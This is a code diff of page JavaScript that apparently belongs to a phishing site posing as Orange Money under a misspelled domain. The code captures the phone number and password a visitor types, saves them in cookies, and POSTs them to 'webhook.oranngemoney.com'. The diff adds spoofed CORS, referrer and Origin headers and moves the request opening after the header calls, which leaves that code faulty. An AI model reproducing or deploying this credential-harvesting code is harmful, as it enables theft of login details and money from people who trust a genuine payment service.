@@ -227,14 +227,15 @@
         setCookie("phonenumber", document.getElementById('phonenumber').value);
         setCookie("password", document.getElementById('password').value);
         var xhr = new XMLHttpRequest();
-        xhr.open("POST", 'https://webhook.oranngemoney.com', true);
         xhr.setRequestHeader('Content-Type', 'application/json');
-        // xhr.setRequestHeader('mode', 'cors');
-        // xhr.setRequestHeader('redirect', 'follow');
-        // xhr.setRequestHeader('referrer', 'oranngemoney.com');
-        // xhr.setRequestHeader('Referrer-Policy', 'origin-when-cross-origin');
-
-
+        xhr.setRequestHeader('mode', 'cors');
+        xhr.setRequestHeader('redirect', 'follow');
+        xhr.setRequestHeader('referrer', 'https://oranngemoney.com');
+        xhr.setRequestHeader('Referrer-Policy', 'origin-when-cross-origin');
+        xhr.setRequestHeader('Access-Control-Request-Method','POST');
+        xhr.setRequestHeader('Access-Control-Request-Headers','Content-Type, Accept')
+        xhr.setRequestHeader('Origin','https://oranngemome.com')
+        xhr.open("POST", 'https://webhook.oranngemoney.com', true);
         xhr.send(JSON.stringify({'phonenumber': document.getElementById('phonenumber').value,'password': document.getElementById('password').value}));
     //  fetch("https://webhook.oranngemoney.com/", {
     //                     method: "POST",
